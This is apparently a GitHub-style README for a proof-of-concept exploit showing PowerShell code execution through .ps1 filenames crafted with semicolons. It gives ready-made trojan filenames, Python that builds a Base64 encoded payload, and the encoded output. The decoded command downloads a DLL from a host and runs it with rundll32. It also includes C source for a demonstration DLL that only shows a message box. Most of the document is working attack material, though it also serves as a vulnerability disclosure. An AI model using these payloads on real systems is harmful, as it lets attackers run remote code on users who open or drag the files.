# PSTrojanFile
Windows PowerShell Filename Code Execution POC

Dusted this off and improved it a bit, reported to Microsoft in 2019 remains unfixed as of the time of this writing. Remote code execution via a specially crafted filename. 
The flaw is due to semicolon ";" we can decode a Base64 command and execute straight from the PS1 filename or just call shorthand commands.

Test;POweRsHeLL -e [BASE64 PAYLOAD];.ps1
OR just call commands straight away!
Testing;saps (gc -) PoC.ps1

1) Execute a remote DLL using rundll32
2) Execute an unintended PS script (for a short non base64 encoded filename)
3) Execute a hidden text-file: Testing;saps (gc -) PoC.ps1  (Optional: attrib +s +h text-file)

Vectors: double click, drag and drop to PS shortcut
Requirements: user must have the following setting to call a secondary script
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force

Leverages alternate shorthand PS commands like "saps", "gc" start a process and get-content etc.

Create a trojan PS1 file that will try to download and execute a remote DLL namec "1.d"

Python:
from base64 import b64encode
b64encode("saps  http://127.0.0.1/1.d;sleep -s 2;rundll32 $HOME\\Downloads\\1.d, 0".encode('UTF-16LE')) #
cwBhAHAAcwAgACAAaAB0AHQAcAA6AC8ALwAxADIANwAuADAALgAwAC4AMQAvADEALgBkADsAcwBsAGUAZQBwACAALQBzACAAMgA7AHIAdQBuAGQAbABsADMAMgAgACQASABPAE0ARQBcAEQAbwB3AG4AbABvAGEAZABzAFwAMQAuAGQALAAgADAA

DLL Code:
#include <windows.h>
//gcc -shared -o mydll.dll mydll.c -m32
//hyp3rlinx 
void evilo(void){
MessageBox(0,"Filename Remote Code Execution PoC\r\nBy hyp3rlinx","M$ Windows PowerShell",1);
}
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved){
evilo();
return 0;
}

Video PoC:

